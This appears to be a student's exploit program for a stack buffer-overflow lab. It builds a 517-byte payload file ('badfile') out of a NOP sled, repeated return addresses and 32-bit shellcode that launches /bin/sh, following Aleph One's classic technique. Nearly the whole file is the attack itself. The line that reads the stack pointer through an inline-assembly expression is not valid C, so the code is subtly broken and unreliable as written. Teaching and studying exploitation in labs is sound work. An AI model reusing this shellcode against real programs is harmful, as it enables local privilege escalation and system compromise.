/* exploit.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdq                            */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

int main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

	/*
	 * Based on "Smashing The Stack For Fun And Profit" by Aleph One
	 * (http://cecs.wright.edu/~tkprasad/courses/cs781/alephOne.html)
	 */

	//variables for pointer values
    char *pointer; //pointer
	long *address_pointer; //pointer to go to return address, which will take us to the "bad" stuff.
	long return_address; //return address
	
	//variables for int values - needed for placement
	int offset = 200; //offset of return address from the stack pointer
	int buffer_size = 517; //size of buffer
	
	long stack_pointer = __asm__("movl	%esp,%eax");
	//compile stack pointer - move contents of %esp (stack pointer) to %eax (general purpose register)
	
	return_address = stack_pointer + offset; //initializing return address
	
	pointer = buffer; //Now that the return address has been set, we can send the pointer to the buffer.
	address_pointer = (long*)pointer; //preparing address pointer
	
	/*
	 * Step 1: Fill the start of the buffer (via address pointer) with the return address,
	 * which is where the code will return to after running the shell code..
	 * This for loop needs to be done so many times because we want to have it
	 * overwhelm/overload the stack buffer.
	 */
	for( int i = 0; i < 20; i++)
	{
		*(address_pointer++) = return_address;
	}
	
	/*
	 * Step 2: Fill the rest of the buffer with shell code, taken from the char array ("shellcode") above.
	 */
	for( int i = 0; i < strlen(shellcode); i++ )
	{
		buffer[buffer_size - (sizeof(shellcode)+1) + i] = shellcode[i];
	}
	
	buffer[buffer_size - 1] = '\0'; //'\0' is a null. Insert at the end of the buffer.

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}